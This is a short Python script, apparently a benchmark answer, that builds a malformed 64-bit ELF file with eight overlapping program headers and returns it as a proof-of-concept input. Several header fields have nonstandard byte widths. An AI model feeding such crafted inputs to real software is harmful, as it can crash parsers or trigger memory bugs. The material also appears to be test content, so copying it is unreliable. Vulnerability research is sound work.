class Solution:
    def solve(self, src_path: str) -> bytes:
        e_ident = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00'
        e_type = b'\x02\x00'
        e_machine = b'\x3e\x00'
        e_version = b'\x01\x00\x00\x00'
        e_entry = b'\x00\x00\x00\x00\x00\x00\x00\x00'
        e_phoff = b'\x40\x00\x00\x00\x00\x00\x00\x00'
        e_shoff = b'\x00\x00\x00\x00\x00\x00\x00\x00'
        e_flags = b'\x00\x00\x00'
        e_ehsize = b'\x40\x00'
        e_phentsize = b'\x38\x00'
        e_phnum = b'\x08\x00'
        e_shentsize = b'\x00\x00'
        e_shnum = b'\x00\x00'
        e_shstrndx = b'\x00\x00'
        elf_header = e_ident + e_type + e_machine + e_version + e_entry + e_phoff + e_shoff + e_flags + e_ehsize + e_phentsize + e_phnum + e_shentsize + e_shnum + e_shstrndx
        ph = b''
        for i in range(8):
            p_type = b'\x01\x00\x00\x00'
            p_flags = b'\x05\x00\x00\x00'
            p_offset = b'\x00\x00\x00\x00'
            p_vaddr = b'\x00\x00\x40\x00\x00\x00\x00\x00'
            p_paddr = b'\x00\x00\x40\x00\x00\x00\x00\x00'
            p_filesz = b'\x00\x10\x00\x00\x00\x00\x00\x00'
            p_memsz = b'\x00\x20\x00\x00\x00\x00\x00\x00'
            p_align = b'\x00\x10\x00\x00\x00\x00\x00\x00'
            ph += p_type + p_flags + p_offset + p_vaddr + p_paddr + p_filesz + p_memsz + p_align
        poc = elf_header + ph
        return poc